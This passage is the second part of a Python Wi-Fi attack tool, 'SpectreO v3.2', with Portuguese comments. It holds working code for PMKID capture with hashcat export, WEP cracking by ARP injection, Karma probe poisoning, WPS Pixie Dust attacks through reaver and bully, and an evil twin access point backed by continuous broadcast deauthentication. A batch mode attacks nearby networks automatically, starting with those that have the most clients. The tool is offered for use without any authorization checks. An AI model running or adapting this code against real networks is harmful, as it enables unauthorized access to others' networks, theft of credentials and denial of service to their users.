                            b'\x00\x0f\xac\x04'      # Group Cipher: CCMP
                            b'\x01\x00\x00\x0f\xac\x04'  # Pairwise: CCMP
                            b'\x01\x00\x00\x0f\xac\x02'  # AKM: PSK
                            b'\x00\x00'              # Capabilities
                        ))
                
                sendp(assoc, iface=interface, verbose=0)
                log.progress(f"Assoc Request {i+1}/5 (RSN completo)")
                time.sleep(0.5)
            except Exception as e:
                log.debug(f"Erro envio assoc {i+1}: {e}")
                continue
        
        log.progress(f"Aguardando resposta PMKID ({CONFIG['pmkid_timeout']}s)...")
        sniff(iface=interface, prn=handler, timeout=CONFIG['pmkid_timeout'], store=False)
        
        if pmkid_packets:
            log.info(f"{len(pmkid_packets)} pacotes EAPOL capturados")
            log.progress("Validando PMKID com OUI + Type...")
            
            valid, result = CaptureValidator.validate_pmkid(pmkid_packets)
            
            if valid:
                filename_base = f"pmkid_{sanitize_filename(target['bssid'])}_{sanitize_filename(target['ssid'])}"
                cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                
                log.progress("Salvando captura...")
                wrpcap(cap_file, pmkid_packets)
                
                hc_file = export_to_hashcat(cap_file, 'pmkid', manager)
                manager.add_capture(target['bssid'], target['ssid'], 'pmkid',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("="*70)
                log.success("PMKID CAPTURADO E VALIDADO!")
                log.success("="*70)
                log.info(f"OUI: {result.get('oui', 'N/A')} (Wi-Fi Alliance)")
                log.info(f"Type: 0x{result.get('type', 0):02x} (PMKID KDE)")
                log.info(f"PMKID: {result['pmkid']}")
                log.info(f"Pacote: #{result.get('packet_num', 'N/A')}")
                if hc_file:
                    log.info(f"Hashcat: {hc_file}")
                
                return True
            else:
                log.warning(f"Tentativa {attempt}: PMKID inválido ou não encontrado")
        else:
            log.warning(f"Tentativa {attempt}: nenhum EAPOL recebido")
        
        if attempt < CONFIG['pmkid_retries']:
            log.info("Aguardando 5s antes de retry...")
            time.sleep(5)
    
    log.error("="*70)
    log.error("FALHA: PMKID não obtido (AP pode não suportar)")
    log.error("="*70)
    return False

def attack_wep(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 3: WEP ARP Injection")
    log.info("="*70)
    
    if 'WEP' not in str(target['crypto']):
        log.error("Alvo não é WEP!")
        return False
    
    set_channel(interface, target['channel'])
    output_base = f"wep_{sanitize_filename(target['bssid'])}"
    output = os.path.join(manager.cap_dir, output_base)
    
    log.progress("Iniciando airodump-ng...")
    airodump_proc = subprocess.Popen(['airodump-ng', '-c', str(target['channel']), 
                                     '--bssid', target['bssid'], '-w', output, 
                                     '--output-format', 'cap', interface],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    cleanup_handler.register_process(airodump_proc)
    time.sleep(3)
    
    aireplay_proc = None
    if target['clients']:
        client_mac = target['clients'][0]
        log.info(f"ARP injection com cliente {client_mac}")
        aireplay_proc = subprocess.Popen(['aireplay-ng', '--arpreplay', 
                                         '-b', target['bssid'], '-h', client_mac, interface],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cleanup_handler.register_process(aireplay_proc)
    else:
        log.warning("Sem clientes - coleta passiva (LENTO)")
    
    log.info("Coletando IVs (max 10min, meta: 50k)...")
    start_time = time.time()
    
    while time.time() - start_time < 600:
        elapsed = int(time.time() - start_time)
        cap_file = f"{output}-01.cap"
        if os.path.exists(cap_file):
            try:
                pkts = rdpcap(cap_file)
                iv_count = len(pkts)
                log.progress(f"IVs: {iv_count} ({elapsed}s)")
                if iv_count >= 50000:
                    log.success("50k IVs!")
                    break
            except:
                pass
        time.sleep(10)
    
    airodump_proc.kill()
    if aireplay_proc:
        aireplay_proc.kill()
    
    log.progress("Iniciando crack...")
    
    cap_file = f"{output}-01.cap"
    if os.path.exists(cap_file):
        log.progress("Executando aircrack-ng...")
        result = subprocess.run(['aircrack-ng', cap_file],
                               capture_output=True, text=True, 
                               timeout=CONFIG['universal_timeout']*6)
        
        if 'KEY FOUND!' in result.stdout:
            log.success("="*70)
            log.success("WEP CRACKEADO!")
            log.success("="*70)
            
            for line in result.stdout.split('\n'):
                if 'KEY FOUND!' in line:
                    key = line.split('[')[1].split(']')[0].strip()
                    log.success(f"Chave WEP: {key}")
            
            manager.add_capture(target['bssid'], target['ssid'], 'wep',
                               cap_file, None, target['channel'], target['signal'], {})
            return True
        else:
            log.warning("IVs insuficientes")
    
    log.error("FALHA WEP")
    return False

def attack_karma(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 4: Karma (Probe Poisoning)")
    log.info("="*70)
    
    captured_probes = set()
    
    def handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                client_mac = pkt[Dot11].addr2
                
                if ssid and ssid not in captured_probes:
                    captured_probes.add(ssid)
                    log.success(f"Probe: {client_mac} -> '{ssid}'")
                    
                    log.progress(f"Respondendo como '{ssid}'...")
                    response = RadioTap()/Dot11(type=0, subtype=8, addr1=client_mac, 
                                               addr2=interface, addr3=interface)/\
                              Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info=ssid)
                    sendp(response, iface=interface, verbose=0)
            except:
                pass
    
    log.info("Escutando probes (Ctrl+C ou 120s)...")
    try:
        sniff(iface=interface, prn=handler, store=False, timeout=120)
    except KeyboardInterrupt:
        pass
    
    log.info(f"{len(captured_probes)} SSIDs capturados")
    return False

def attack_wps(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 5: WPS PIN (Reaver + Bully)")
    log.info("="*70)
    
    try:
        log.progress("Detectando WPS com wash...")
        result = subprocess.run(['wash', '-i', interface, '-C'], 
                               capture_output=True, text=True, 
                               timeout=CONFIG['universal_timeout'])
        
        if target['bssid'] not in result.stdout:
            log.error("WPS não detectado")
            return False
        
        log.success("WPS detectado!")
        
        log.info("Reaver Pixie Dust...")
        try:
            reaver_result = subprocess.run(['reaver', '-i', interface, '-b', target['bssid'], 
                                           '-c', str(target['channel']), '-K', '1', '-vv'], 
                                          capture_output=True, text=True, timeout=300)
            
            if 'WPS PIN:' in reaver_result.stdout:
                log.success("Reaver Pixie SUCESSO!")
                for line in reaver_result.stdout.split('\n'):
                    if 'WPS PIN:' in line or 'WPA PSK:' in line:
                        log.success(line.strip())
                return True
        except subprocess.TimeoutExpired:
            log.warning("Reaver timeout")
        
        log.info("Fallback: Bully Pixie...")
        try:
            bully_result = subprocess.run(['bully', interface, '-b', target['bssid'], 
                                          '-c', str(target['channel']), '-d'], 
                                         capture_output=True, text=True, timeout=300)
            
            if 'PIN:' in bully_result.stdout:
                log.success("Bully Pixie SUCESSO!")
                return True
        except:
            pass
    
    except Exception as e:
        log.error(f"Erro WPS: {e}")
    
    log.error("FALHA WPS")
    return False

def attack_evil_twin_no_portal(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 6: Evil Twin (Handshake Capture)")
    log.info("="*70)
    log.info("Estratégia: Deauth AP real + AP falso = captura handshake")
    
    hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={target['ssid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=0
"""
    
    hostapd_conf_file = '/tmp/hostapd_evil.conf'
    with open(hostapd_conf_file, 'w') as f:
        f.write(hostapd_conf)
    
    log.progress("Iniciando hostapd...")
    hostapd_proc = subprocess.Popen(['hostapd', hostapd_conf_file],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    cleanup_handler.register_process(hostapd_proc)
    
    if not wait_for_hostapd(hostapd_proc, interface, target['ssid']):
        log.error("Hostapd falhou")
        hostapd_proc.kill()
        return False
    
    log.success("AP falso ativo!")
    
    stop_deauth = threading.Event()
    
    def continuous_deauth():
        while not stop_deauth.is_set():
            log.progress("Deauth no AP real...")
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            sendp(frame, iface=interface, count=5, inter=0.5, verbose=0)
            time.sleep(2)
    
    deauth_thread = threading.Thread(target=continuous_deauth, daemon=True)
    deauth_thread.start()
    
    state = CaptureState()
    
    def handler(pkt):
        if pkt.haslayer(EAPOL):
            state.add_packet(pkt)
            log.success(f"[EVIL TWIN] EAPOL {state.packet_count()}/4")
            if state.packet_count() >= 4:
                valid, _ = CaptureValidator.validate_handshake(state.get_packets())
                if valid:
                    log.success("Handshake válido no Evil Twin!")
                    state.set_captured(True)
                    return True
    
    log.info("Aguardando clientes (max 5min)...")
    try:
        sniff(iface=interface, prn=handler, timeout=300, 
              stop_filter=lambda x: state.is_captured(), store=False)
    except KeyboardInterrupt:
        pass
    
    stop_deauth.set()
    hostapd_proc.kill()
    
    if state.is_captured():
        valid, result = CaptureValidator.validate_handshake(state.get_packets())
        
        if valid:
            filename_base = f"evil_{sanitize_filename(target['bssid'])}_{sanitize_filename(target['ssid'])}"
            cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
            wrpcap(cap_file, state.get_packets())
            
            hc_file = export_to_hashcat(cap_file, 'handshake', manager)
            manager.add_capture(target['bssid'], target['ssid'], 'evil_twin',
                               cap_file, hc_file, target['channel'], target['signal'], result)
            
            log.success("="*70)
            log.success("HANDSHAKE via Evil Twin!")
            log.success("="*70)
            return True
    
    log.error("FALHA Evil Twin")
    return False

# ============================================================================
# BATCH INTELIGENTE (PMF-AWARE + PMKID PRIORITY)
# ============================================================================

def batch_mode_intelligent(targets, interface, manager, detector):
    log.info("="*70)
    log.info("MODO BATCH INTELIGENTE v3.2")
    log.info("="*70)
    
    filtered = [(b, i) for b, i in targets 
                if len(i['clients']) >= CONFIG['batch_min_clients'] 
                and i['signal'] >= CONFIG['batch_min_signal']][:CONFIG['batch_max_targets']]
    
    log.info(f"{len(filtered)} alvos selecionados\n")
    
    success = 0
    stats = {'handshake': 0, 'pmkid': 0, 'wep': 0, 'wps': 0, 'failed': 0}
    
    for idx, (bssid, info) in enumerate(filtered, 1):
        target = {**info, 'bssid': bssid}
        crypto_str = ', '.join(str(c) for c in target['crypto']) if target['crypto'] else 'OPEN'
        
        log.info(f"\n{'='*70}")
        log.info(f"ALVO {idx}/{len(filtered)}: {target['ssid']}")
        log.info(f"BSSID: {target['bssid']}")
        log.info(f"Crypto: {crypto_str} | Canal: {target['channel']} | Sinal: {target['signal']}dBm")
        log.info(f"Clientes: {len(target['clients'])} | PMF: {'Sim' if target.get('pmf') else 'Não'}")
        log.info("="*70)
        
        result = False
        
        # WEP
        if 'WEP' in str(target['crypto']):
            log.info("→ WEP detectado")
            result = attack_wep(target, interface, manager, detector)
            if result:
                stats['wep'] += 1
                success += 1
        
        # WPS
        elif 'WPS' in str(target['crypto']):
            log.info("→ WPS detectado, tentando Pixie Dust...")
            result = attack_wps(target, interface, manager, detector)
            if result:
                stats['wps'] += 1
                success += 1
            else:
                log.info("→ WPS falhou, tentando Handshake...")
                result = attack_handshake(target, interface, manager, detector)
                if result:
                    stats['handshake'] += 1
                    success += 1
                else:
                    log.info("→ Handshake falhou, tentando PMKID...")
                    result = attack_pmkid(target, interface, manager, detector)
                    if result:
                        stats['pmkid'] += 1
                        success += 1
        
        # WPA/WPA2 (INTELIGÊNCIA PMF v3.2)
        elif 'WPA' in str(target['crypto']) or 'WPA2' in str(target['crypto']):
            # Se tem PMF, PRIORIZA PMKID (deauth não funciona)
            if target.get('pmf'):
                log.info("→ WPA/WPA2 com PMF detectado!")
                log.info("→ Estratégia: PMKID primeiro (deauth bloqueado por PMF)")
                result = attack_pmkid(target, interface, manager, detector)
                if result:
                    stats['pmkid'] += 1
                    success += 1
                else:
                    log.info("→ PMKID falhou, tentando Handshake (pode falhar por PMF)...")
                    result = attack_handshake(target, interface, manager, detector)
                    if result:
                        stats['handshake'] += 1
                        success += 1
            else:
                # Sem PMF: Handshake primeiro (mais rápido)
                log.info("→ WPA/WPA2 sem PMF")
                log.info("→ Estratégia: Handshake primeiro, PMKID fallback")
                result = attack_handshake(target, interface, manager, detector)
                if result:
                    stats['handshake'] += 1
                    success += 1
                else:
                    log.info("→ Handshake falhou, tentando PMKID...")
                    result = attack_pmkid(target, interface, manager, detector)
                    if result:
                        stats['pmkid'] += 1
                        success += 1
        
        else:
            log.warning("→ Crypto não suportada ou OPEN, pulando...")
        
        if not result:
            stats['failed'] += 1
            log.error(f"✗ FALHA no alvo {target['ssid']}")
        else:
            log.success(f"✓ SUCESSO no alvo {target['ssid']}")
        
        # Meta de capturas
        if CONFIG['batch_target_captures'] and success >= CONFIG['batch_target_captures']:
            log.success(f"Meta de {CONFIG['batch_target_captures']} capturas atingida!")
            break
        
        if idx < len(filtered):
            log.info("Aguardando 5s antes do próximo...")
            time.sleep(5)
    
    log.info("\n" + "="*70)
    log.success("BATCH COMPLETO")
    log.info("="*70)
    log.info(f"Sucessos: {success}/{len(filtered)} ({success/len(filtered)*100 if len(filtered) > 0 else 0:.1f}%)")
    log.info(f"Falhas: {stats['failed']}")
    log.info(f"\nPor método:")
    log.info(f"  Handshake: {stats['handshake']}")
    log.info(f"  PMKID: {stats['pmkid']}")
    log.info(f"  WEP: {stats['wep']}")
    log.info(f"  WPS: {stats['wps']}")

# ============================================================================
# MENU + MAIN
# ============================================================================

ATTACKS = {
    '1': {'name': 'Handshake WPA/WPA2', 'func': attack_handshake},
    '2': {'name': 'PMKID (v3.2 RIGOROSO)', 'func': attack_pmkid},
    '3': {'name': 'WEP ARP Injection', 'func': attack_wep},
    '4': {'name': 'Karma Attack', 'func': attack_karma},
    '5': {'name': 'WPS PIN (Reaver + Bully)', 'func': attack_wps},
    '6': {'name': 'Evil Twin (Handshake)', 'func': attack_evil_twin_no_portal},
    'B': {'name': 'BATCH INTELIGENTE (PMF-aware)', 'func': None}
}

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║        SpectreO v3.2 - Production Hardened Edition           ║
║                   (PMKID VALIDATION FIX)                     ║
╠══════════════════════════════════════════════════════════════╣
║  NOVA v3.2:                                                  ║
║    ✓ Validação RIGOROSA PMKID (OUI + Type)                  ║
║    ✓ Association Request completo (RSN)                      ║
║    ✓ Timeout PMKID aumentado (30s)                           ║
║    ✓ Retry inteligente (3 tentativas)                        ║
║    ✓ Zero falsos positivos                                   ║
║                                                              ║
║  Todas correções v3.1 mantidas:                              ║
║    ✓ Sanitização completa                                    ║
║    ✓ Timeouts universais                                     ║
║    ✓ Cleanup handler (atexit + signal)                       ║
║    ✓ Validação hostapd real                                  ║
║    ✓ Detecção PMF (802.11w)                                  ║
║    ✓ Auto-detect interface                                   ║
║    ✓ Logging dual                                            ║
║    ✓ Verificação MAC change                                  ║
║    ✓ Validação JSON                                          ║
║    ✓ Root check                                              ║
║                                                              ║
║  6 Ataques Completos:                                        ║
║    1. Handshake WPA/WPA2 (PMF detection)                    ║
║    2. PMKID v3.2 (validação rigorosa)                        ║
║    3. WEP ARP Injection                                      ║
║    4. Karma Attack                                           ║
║    5. WPS PIN (Reaver + Bully)                               ║
║    6. Evil Twin (Handshake Capture)                          ║
║    B. Batch Inteligente (PMF-aware + PMKID priority)         ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if os.geteuid() != 0:
        log.error("ROOT REQUIRED - Execute: sudo python3 spectreo_v3.2.py")
        sys.exit(1)
    
    log.info(f"Log file: {CONFIG['log_file']}")
    log.info(f"PMKID timeout: {CONFIG['pmkid_timeout']}s")
    log.info(f"PMKID retries: {CONFIG['pmkid_retries']}")
    
    optimize_system()
    manager = CaptureManager(CONFIG['output_dir'])
    detector = CountermeasureDetector()
    
    interface = CONFIG['interface']
    if not interface:
        interface = detect_wireless_interface()
        if not interface:
            log.error("Interface não detectada. Configure manualmente em CONFIG['interface']")
            sys.exit(1)
        CONFIG['interface'] = interface
    
    setup_interface(interface)
    time.sleep(2)
    
    networks = scan(interface, duration=CONFIG['scan_duration'])
    
    if not networks:
        log.error("Nenhuma rede encontrada")
        return
    
    available = {b: i for b, i in networks.items() 
                 if not (CONFIG['skip_captured'] and manager.is_captured(b))}
    
    if not available:
        log.warning("Todas já capturadas")
        return
    
    targets = sorted(available.items(), 
                    key=lambda x: (len(x[1]['clients']), x[1]['signal']), 
                    reverse=True)
    
    log.info(f"\n{len(targets)} alvos:\n")
    for i, (bssid, info) in enumerate(targets, 1):
        crypto = ', '.join(str(c) for c in info['crypto']) if info['crypto'] else 'OPEN'
        pmf_str = ' [PMF]' if info.get('pmf') else ''
        print(f"{i:2}. {info['ssid'][:20]:20} | {bssid} | Ch{info['channel']:2} | {info['signal']:4}dBm | {len(info['clients'])}cli | {crypto}{pmf_str}")
    
    mode = input("\n[?] Modo (I)nterativo ou (B)atch: ").strip().upper()
    
    if mode == 'B':
        batch_mode_intelligent(targets, interface, manager, detector)
    else:
        choice = int(input("\n[?] Alvo (número): ")) - 1
        bssid, info = targets[choice]
        target = {**info, 'bssid': bssid}
        
        print(f"\n{'='*70}\nATAQUES\n{'='*70}\n")
        for key, attack in ATTACKS.items():
            if attack['func']:
                print(f"{key}. {attack['name']}")
        
        atk = input("\n[?] Ataque: ").strip()
        if atk in ATTACKS and ATTACKS[atk]['func']:
            ATTACKS[atk]['func'](target, interface, manager, detector)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("\nInterrompido pelo usuário")
    except Exception as e:
        log.error(f"Erro fatal: {e}")
        import traceback
        traceback.print_exc()
